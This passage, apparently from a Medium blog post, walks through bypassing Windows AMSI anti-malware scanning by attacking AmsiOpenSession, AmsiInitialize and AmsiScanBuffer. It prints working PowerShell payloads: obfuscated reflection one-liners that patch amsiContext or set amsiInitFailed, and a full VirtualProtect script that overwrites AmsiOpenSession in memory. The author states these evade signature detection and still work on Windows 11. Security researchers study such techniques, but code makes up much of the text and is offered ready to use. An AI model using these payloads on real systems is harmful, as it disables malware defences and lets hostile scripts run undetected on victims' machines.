class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">As long as the first DWORD is not equal to “AMSI”, the execution will jump to the following code block:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="e2d8" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-section">loc_18000250B:</span><br>mov eax, 80070057h<br>retn<br>AmsiOpenSession endp</span></pre><p id="ef85" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">EAX is set as <strong class="ni gs">0x80070057</strong>, which is <strong class="ni gs">E_INVALIDARG</strong> error. The execution of AmsiOpenSession is unsuccessful, and so will all subsequent calls to the AMSI API.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pr"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Zna9zB_GzPK8VnombAsvEg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Zna9zB_GzPK8VnombAsvEg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Zna9zB_GzPK8VnombAsvEg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Zna9zB_GzPK8VnombAsvEg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Zna9zB_GzPK8VnombAsvEg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Zna9zB_GzPK8VnombAsvEg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zna9zB_GzPK8VnombAsvEg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Zna9zB_GzPK8VnombAsvEg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Zna9zB_GzPK8VnombAsvEg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Zna9zB_GzPK8VnombAsvEg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Zna9zB_GzPK8VnombAsvEg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Zna9zB_GzPK8VnombAsvEg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Zna9zB_GzPK8VnombAsvEg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Zna9zB_GzPK8VnombAsvEg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="467" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*Zna9zB_GzPK8VnombAsvEg.png"></picture></div></div></figure><p id="28a0" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">However, on Windows 11, the first DWORD is not checked anymore. Fortunately, there are still multiple ways to land that code block. The <strong class="ni gs">RDX</strong>, <strong class="ni gs">RCX</strong>, the <strong class="ni gs">2nd QWORD</strong>, and the <strong class="ni gs">3rd QWORD </strong>are compared to <strong class="ni gs">0</strong> respectively. If <strong class="ni gs">any</strong> of them equals 0, AmsiOpenSession will exit with error.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of ps"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*PjC8Ba52FdDoX6Sd.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*PjC8Ba52FdDoX6Sd.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*PjC8Ba52FdDoX6Sd.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*PjC8Ba52FdDoX6Sd.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*PjC8Ba52FdDoX6Sd.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*PjC8Ba52FdDoX6Sd.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*PjC8Ba52FdDoX6Sd.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*PjC8Ba52FdDoX6Sd.png 640w, https://miro.medium.com/v2/resize:fit:720/0*PjC8Ba52FdDoX6Sd.png 720w, https://miro.medium.com/v2/resize:fit:750/0*PjC8Ba52FdDoX6Sd.png 750w, https://miro.medium.com/v2/resize:fit:786/0*PjC8Ba52FdDoX6Sd.png 786w, https://miro.medium.com/v2/resize:fit:828/0*PjC8Ba52FdDoX6Sd.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*PjC8Ba52FdDoX6Sd.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*PjC8Ba52FdDoX6Sd.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="469" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*PjC8Ba52FdDoX6Sd.png"></picture></div></div></figure><p id="4126" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">The following one-liner payload leverages reflection, it can be used to patch the 1st DWORD to achieve AMSI bypass, now it does not work on Windows 11.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="716c" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-meta.prompt">$</span>a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)</span></pre><p id="ba01" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">The one-liner payload is obfuscated to avoid signature-based detection, let’s break it down:</p><p id="4b88" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">1: Get the assembly that Ref is defined in, then get a list of all types defined in that assembly<br>2: In the list, locate AmsiUtils based on the property characteristics of AmsiUtils, such as IsPublic=False, IsSerial=False, and the Name contains the “iUtils” substring, etc.<br>3: Locate amsiContext in a similar manner<br>4: Get the address of the amsiContext parameter and patch the first DWORD in the structure to 0</p><p id="846c" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Adjust the payload to patch the 2nd QWORD, and it works on Windows 11.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="d96f" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-meta.prompt">$</span>a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)</span></pre><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pt"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*7s139sMAVWUVtEcz.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*7s139sMAVWUVtEcz.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*7s139sMAVWUVtEcz.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*7s139sMAVWUVtEcz.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*7s139sMAVWUVtEcz.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*7s139sMAVWUVtEcz.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7s139sMAVWUVtEcz.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*7s139sMAVWUVtEcz.png 640w, https://miro.medium.com/v2/resize:fit:720/0*7s139sMAVWUVtEcz.png 720w, https://miro.medium.com/v2/resize:fit:750/0*7s139sMAVWUVtEcz.png 750w, https://miro.medium.com/v2/resize:fit:786/0*7s139sMAVWUVtEcz.png 786w, https://miro.medium.com/v2/resize:fit:828/0*7s139sMAVWUVtEcz.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*7s139sMAVWUVtEcz.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*7s139sMAVWUVtEcz.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="255" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*7s139sMAVWUVtEcz.png"></picture></div></div></figure><p id="f870" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">We can also attack AmsiOpenSession with PowerShell script. The following script patched AmsiOpenSession to set RCX as 0.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pu"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*s5mW1UucyXzK737_.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*s5mW1UucyXzK737_.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*s5mW1UucyXzK737_.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*s5mW1UucyXzK737_.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*s5mW1UucyXzK737_.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*s5mW1UucyXzK737_.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*s5mW1UucyXzK737_.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*s5mW1UucyXzK737_.png 640w, https://miro.medium.com/v2/resize:fit:720/0*s5mW1UucyXzK737_.png 720w, https://miro.medium.com/v2/resize:fit:750/0*s5mW1UucyXzK737_.png 750w, https://miro.medium.com/v2/resize:fit:786/0*s5mW1UucyXzK737_.png 786w, https://miro.medium.com/v2/resize:fit:828/0*s5mW1UucyXzK737_.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*s5mW1UucyXzK737_.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*s5mW1UucyXzK737_.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="539" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*s5mW1UucyXzK737_.png"></picture></div></div></figure><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="9853" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">function LookupFunc {<br>    Param ($moduleName, $functionName)<br>    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |<br>    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].<br>     Equals('System.dll')<br>     }).GetType('Microsoft.Win32.UnsafeNativeMethods')<br>    $tmp=@()<br>    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}<br>    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,<br><span class="hljs-meta.prompt">@($</span>moduleName)), $functionName))<br>}<br><br><br>function getDelegateType {<br>    Param (<br>     [Parameter(Position = 0, Mandatory = $True)] [Type[]]<br>     $func, [Parameter(Position = 1)] [Type] $delType = [Void]<br>    )<br>    $type = [AppDomain]::CurrentDomain.<br>    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),<br>[System.Reflection.Emit.AssemblyBuilderAccess]::Run).<br>    DefineDynamicModule('InMemoryModule', $false).<br>    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,<br>    AutoClass', [System.MulticastDelegate])<br><span class="hljs-meta.prompt"><br>  $</span>type.<br>    DefineConstructor('RTSpecialName, HideBySig, Public',<br>[System.Reflection.CallingConventions]::Standard, $func).<br>     SetImplementationFlags('Runtime, Managed')<br><span class="hljs-meta.prompt"><br>  $</span>type.<br>    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,<br><span class="hljs-meta.prompt">$</span>func). SetImplementationFlags('Runtime, Managed')<br>    return $type.CreateType()<br>}<br><span class="hljs-meta.prompt"><br><br>[IntPtr]$</span>funcAddr = LookupFunc amsi.dll AmsiOpenSession<br><span class="hljs-meta.prompt">$</span>oldProtectionBuffer = 0<br><span class="hljs-meta.prompt">$</span>vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))<br><span class="hljs-meta.prompt">$</span>vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)<br><span class="hljs-meta.prompt">$</span>buf = [Byte[]] (0x48,0x31,0xc9)<br>[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)</span></pre><p id="633f" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">After executing the script, we bypassed AMSI.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pv"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*XAeyE1IxocZ84RDz.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*XAeyE1IxocZ84RDz.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*XAeyE1IxocZ84RDz.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*XAeyE1IxocZ84RDz.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*XAeyE1IxocZ84RDz.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*XAeyE1IxocZ84RDz.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*XAeyE1IxocZ84RDz.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*XAeyE1IxocZ84RDz.png 640w, https://miro.medium.com/v2/resize:fit:720/0*XAeyE1IxocZ84RDz.png 720w, https://miro.medium.com/v2/resize:fit:750/0*XAeyE1IxocZ84RDz.png 750w, https://miro.medium.com/v2/resize:fit:786/0*XAeyE1IxocZ84RDz.png 786w, https://miro.medium.com/v2/resize:fit:828/0*XAeyE1IxocZ84RDz.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*XAeyE1IxocZ84RDz.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*XAeyE1IxocZ84RDz.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="233" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*XAeyE1IxocZ84RDz.png"></picture></div></div></figure><h1 id="20c8" class="mi mj gr bc mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bh" data-selectable-paragraph="">Attack AmsiInitialize</h1><p id="37dc" class="pw-post-body-paragraph ng nh gr ni b nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od gk bh" data-selectable-paragraph="">Considering AmsiInitialize is called before we can supply scripts, we cannot directly patch the instruction. However, we can patch the structure pointed by amsiContext as it is initialized after the execution.</p><p id="9742" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Leverage reflection, the raw one-liner payload is as follows:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="bf53" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)</span></pre><p id="1489" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Obfuscate it to avoid signature-based detection:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="b0e5" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-meta.prompt">$</span>a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Failed”) {$f=$e}};$f.SetValue($null,$true)</span></pre><p id="6c11" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">We successfully bypassed AMSI. This payload still works, even on Windows 11.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*JXoSzgYUG8VpeWPw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*JXoSzgYUG8VpeWPw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*JXoSzgYUG8VpeWPw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*JXoSzgYUG8VpeWPw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*JXoSzgYUG8VpeWPw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*JXoSzgYUG8VpeWPw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*JXoSzgYUG8VpeWPw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*JXoSzgYUG8VpeWPw.png 640w, https://miro.medium.com/v2/resize:fit:720/0*JXoSzgYUG8VpeWPw.png 720w, https://miro.medium.com/v2/resize:fit:750/0*JXoSzgYUG8VpeWPw.png 750w, https://miro.medium.com/v2/resize:fit:786/0*JXoSzgYUG8VpeWPw.png 786w, https://miro.medium.com/v2/resize:fit:828/0*JXoSzgYUG8VpeWPw.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*JXoSzgYUG8VpeWPw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*JXoSzgYUG8VpeWPw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="230" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*JXoSzgYUG8VpeWPw.png"></picture></div></div></figure><h1 id="5aca" class="mi mj gr bc mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bh" data-selectable-paragraph="">Attack AmsiScanBuffer</h1><p id="dec4" class="pw-post-body-paragraph ng nh gr ni b nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od gk bh" data-selectable-paragraph="">Inspect assemble codes of AmsiScanBuffer, we also noticed the code block that forces the function to exit with error.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of px"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*7RM90CuLMXCMc9Wv.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*7RM90CuLMXCMc9Wv.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*7RM90CuLMXCMc9Wv.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*7RM90CuLMXCMc9Wv.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*7RM90CuLMXCMc9Wv.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*7RM90CuLMXCMc9Wv.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7RM90CuLMXCMc9Wv.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*7RM90CuLMXCMc9Wv.png 640w, https://miro.medium.com/v2/resize:fit:720/0*7RM90CuLMXCMc9Wv.png 720w, https://miro.medium.com/v2/resize:fit:750/0*7RM90CuLMXCMc9Wv.png 750w, https://miro.medium.com/v2/resize:fit:786/0*7RM90CuLMXCMc9Wv.png 786w, https://miro.medium.com/v2/resize:fit:828/0*7RM90CuLMXCMc9Wv.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*7RM90CuLMXCMc9Wv.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*7RM90CuLMXCMc9Wv.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="375" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*7RM90CuLMXCMc9Wv.png"></picture></div></div></figure><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of py"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*-yLptILQYb4SR0Bj.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*-yLptILQYb4SR0Bj.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*-yLptILQYb4SR0Bj.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*-yLptILQYb4SR0Bj.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*-yLptILQYb4SR0Bj.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*-yLptILQYb4SR0Bj.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*-yLptILQYb4SR0Bj.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" 